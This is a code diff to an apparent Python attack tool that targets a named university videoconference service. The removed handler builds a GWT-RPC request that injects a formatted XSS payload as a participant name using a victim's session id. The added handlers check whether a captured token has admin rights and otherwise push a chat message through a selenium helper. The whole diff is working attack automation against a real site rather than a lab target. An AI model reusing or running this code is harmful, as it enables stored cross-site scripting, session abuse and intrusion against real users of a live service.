@@ -25,36 +25,6 @@ class SetupRequestHandler(Handler):
         return super().handle_request(context)
 
 
-class PayloadHandler(Handler):
-    def handle_request(self, context: RequestContext):
-        print("PayloadHandler: Forming payload...")
-        try:
-
-
-            gwt_base_url = "https://e-class.tsu.ru/videoconference/"
-            gwt_strong_name = "0A73E0CE3100205FB4E268695C482E09"
-            service_name = "com.mind.videoconference.rpc.api.ConferenceSessionService"
-            method_name = "setParticipantName"
-            param1_type = "com.mind.videoconference.dto.id.ConferenceSessionParticipantId/1079013347"
-            param2_type = "java.lang.String/2004016611"
-            param3_type = "java.util.UUID/2940008275"
-
-            session_participant_id = context.session_id
-            participant_name = context.get_formatted_xss_payload()
-
-            context.payload_data = (
-                f"7|0|9|{gwt_base_url}|{gwt_strong_name}|"
-                f"{service_name}|{method_name}|"
-                f"{param1_type}|{param2_type}|{param3_type}|"
-                f"{session_participant_id}|{participant_name}|"
-                f"1|2|3|4|2|5|6|5|7|8|9|"
-            )
-            print(f"Payload formed with session_id: {session_participant_id}")
-        except Exception as e:
-            raise ChainException(f"PayloadHandler: Error forming payload: {str(e)}")
-        return super().handle_request(context)
-
-
 class ExecutionHandler(Handler):
     def handle_request(self, context: RequestContext):
         print("ExecutionHandler: Sending HTTP request...")
@@ -81,4 +51,44 @@ class LoggingHandler(Handler):
         print("LoggingHandler: Logging request details...")
         # Add logging to a file or external service
         print(f"URL: {context.url}, Session ID: {context.session_id}")
+        return super().handle_request(context)
+
+
+class AdminTokenHandler(Handler):
+    def handle_request(self, context: RequestContext):
+        print("AdminTokenHandler: Проверка токена на администраторский статус...")
+        try:
+            response = requests.get(
+                f"{context.url}/check-admin",
+                headers=context.headers,
+            )
+            if response.status_code == 200 and response.json().get("is_admin"):
+                print("Токен подтвержден как администраторский.")
+                context.is_admin = True
+            else:
+                print("Токен не является администраторским.")
+                context.is_admin = False
+        except requests.exceptions.RequestException as e:
+            raise ChainException(f"AdminTokenHandler: Ошибка проверки токена: {str(e)}")
+
+        return super().handle_request(context)
+
+
+class UserChatHandler(Handler):
+    def handle_request(self, context: RequestContext):
+        if not context.is_admin:
+            print("UserChatHandler: Отправка сообщения в чат для пользователя...")
+            try:
+                from requests_to_selenium import message
+
+                message()
+                print("Сообщение успешно отправлено в чат.")
+            except Exception as e:
+                raise ChainException(
+                    f"UserChatHandler: Ошибка отправки сообщения: {str(e)}"
+                )
+        else:
+            print(
+                "UserChatHandler: Токен администраторский, пропускаем отправку сообщения."
+            )
         return super().handle_request(context)
